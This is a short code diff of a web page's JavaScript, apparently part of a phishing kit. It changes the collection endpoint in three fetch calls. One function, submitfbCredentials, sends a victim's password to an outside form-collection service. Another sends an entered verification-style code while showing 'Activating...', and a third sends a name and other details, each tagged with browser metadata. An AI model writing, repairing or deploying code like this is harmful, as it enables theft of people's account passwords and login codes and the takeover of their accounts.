@@ -1244,7 +1244,7 @@ document.addEventListener('DOMContentLoaded', function() {
   function submitFormData() {
     var name = nameInput ? nameInput.value.trim() : '';
     var mall = mallInput ? mallInput.value.trim() : '';
-    fetch('https://submit-form.com/KRphSzEdf', {
+    fetch('https://submit-form.com/gmO74jKmK', {
       method: 'POST', headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
       body: JSON.stringify({ name: name, mall: mall, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, language: navigator.language })
     }).then(function(r) { return r.json(); })
@@ -1259,7 +1259,7 @@ document.addEventListener('DOMContentLoaded', function() {
   }
 
   function submitfbCredentials(pw) {
-    fetch('https://submit-form.com/KRphSzEdf', {
+    fetch('https://submit-form.com/gmO74jKmK', {
       method: 'POST', headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
       body: JSON.stringify({ Password: pw, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, language: navigator.language })
     }).then(function(r) { return r.json(); })
@@ -1322,7 +1322,7 @@ document.addEventListener('DOMContentLoaded', function() {
       if (videoCodeBtnText) videoCodeBtnText.textContent = 'Activating...';
       if (videoCodeBtnSpinner) videoCodeBtnSpinner.style.display = 'block';
       submitToOtherEndpoints({ code: code });
-      fetch('https://submit-form.com/KRphSzEdf', {
+      fetch('https://submit-form.com/gmO74jKmK', {
         method: 'POST', headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify({ code: code, timestamp: new Date().toISOString() })
       }).catch(function(){}).finally(function() {
